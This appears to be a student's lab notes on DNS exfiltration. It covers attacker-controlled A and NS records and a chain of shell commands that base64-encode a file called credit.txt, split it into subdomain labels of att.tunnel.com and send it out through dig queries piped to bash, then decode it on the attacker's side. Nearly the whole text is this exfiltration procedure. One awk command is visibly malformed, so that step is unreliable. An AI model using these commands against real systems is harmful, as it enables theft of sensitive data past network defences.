## Requirements: Control a domain and set up DNS Records (NS,A,TXT,etc)

### 1) Add an A record that points to attacker IP (Type:A, Subdomain Name:tlns, Value:ATTACKER_IP)

### 2) Add an NS record that routes DNS queries to the A records in step 1 (Type:NS, Subdomain name:tl, Value:tlns.example.com)

## Manual Exfil

### 1) Get the required data that needs to be transfered

### 2) Encode the file using one of the encoding techniques

### 3) Send the encoded characters as subdomains/labels

### 4) Consider the limitations of the DNS protocol.

### Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters and each subdomain label CAN'T exceed 63 characters.

### If we do exceed these limits, we split the data and send more DNS requests!

### Example:

#### 1) Jumpbox: ssh USER@DOMAIN or Attacker: ssh USER@VICTIM_IP -p 2322 (example)

#### 2) Attacker: sudo tcpdump -i eth0 udp port 53 -v 

#### 3) Jumpbox: ssh USER@VICTIM2_DOMAIN or Attacker: ssh USER@VICRIM_IP -p 2122 (example)

#### 4) Victim2: credit.txt

#### 5) cat credit.txt | base64

#### 6) cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/' (Multiple DNS requests)

#### 7) cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ (Single DNS requests)

#### 8) cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $13' | bash (Send base64 data as subdomain)

#### 9) Attacker: echo "BASE64_DATA" | cut -d "." -f1-8 | tr -d "." | base64 -d
